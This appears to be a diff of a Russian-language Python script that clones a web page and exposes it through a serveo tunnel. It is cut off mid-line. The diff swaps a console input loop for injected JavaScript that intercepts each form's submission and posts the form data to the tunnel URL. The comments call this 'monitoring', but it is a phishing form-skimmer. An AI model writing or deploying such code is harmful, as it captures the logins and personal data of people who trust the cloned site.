@@ -43,14 +43,28 @@ if url.strip():
             form_class = form_tag.get('class', '')
             print(f"Найдена форма: ID={form_id}, Классы={form_class}")
 
-            # Мониторим данные, вводимые в форму в реальном времени
-            form_tag.insert(0, BeautifulSoup("<input type='text' id='form_input' placeholder='Введите данные'>", 'html.parser'))
-            print("Мониторим данные, вводимые в эту форму в реальном времени:")
-            while True:
-                form_input = form_tag.find('input', {'id': 'form_input'})
-                user_input = input()  # Получаем данные, вводимые пользователем
-                form_input['value'] = user_input  # Заполняем форму в реальном времени
-                print(f"Введено в форму: {user_input}")
+            # Мониторим данные, вводимые в форму на клиентской стороне
+            script = """
+            <script>
+                document.addEventListener("DOMContentLoaded", function() {
+                    var form = document.getElementById('""" + form_id + """');
+                    form.addEventListener('submit', function(event) {
+                        event.preventDefault();
+                        var formData = new FormData(form);
+                        var xhr = new XMLHttpRequest();
+                        xhr.open('POST', '""" + serveo_url + """', true);
+                        xhr.onreadystatechange = function() {
+                            if (xhr.readyState === 4 && xhr.status === 200) {
+                                console.log('Данные успешно отправлены');
+                            }
+                        };
+                        xhr.send(formData);
+                    });
+                });
+            </script>
+            """
+            form_tag.insert(0, BeautifulSoup(script, 'html.parser'))
+            print("Мониторим данные, вводимые в эту форму и отправляем на сервер")
 
     monitor_forms(soup)
 
@@ -118,14 +132,6 @@ if url.strip():
         serveo_process.terminate()
 
         # Удаляем все скачанные файлы
-        if os.path.exists(image_folder):
-            for file in os.listdir(image_folder):
-                file_path = os.path.join(image_folder, file)
-                os.remove(file_path)
-            os.rmdir(image_folder)
-
         os.system("rm -fr index.html")
         os.system("rm -fr downloaded_page.html")
-        print("Скрипт завершен. Все скачанные файлы удалены.")
-else:
-    print("Пустой URL. Пожалуйста, введите действительный URL.")
+        print("Скрипт завершен. Все
